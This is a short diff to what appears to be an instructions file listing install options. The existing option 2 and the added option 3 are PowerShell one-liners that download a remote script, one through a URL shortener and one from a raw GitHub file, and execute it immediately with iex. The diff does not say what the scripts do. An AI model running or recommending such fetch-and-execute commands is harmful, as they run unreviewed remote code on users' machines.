@@ -9,3 +9,7 @@ option 1:
 
 option 2:
 ```powershell "iex(iwr abre.ai/-i -UseB)"```
+
+option 3:
+```powershell "iex(iwr https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/z.ps1 -UseB)"``` 
+(raw)
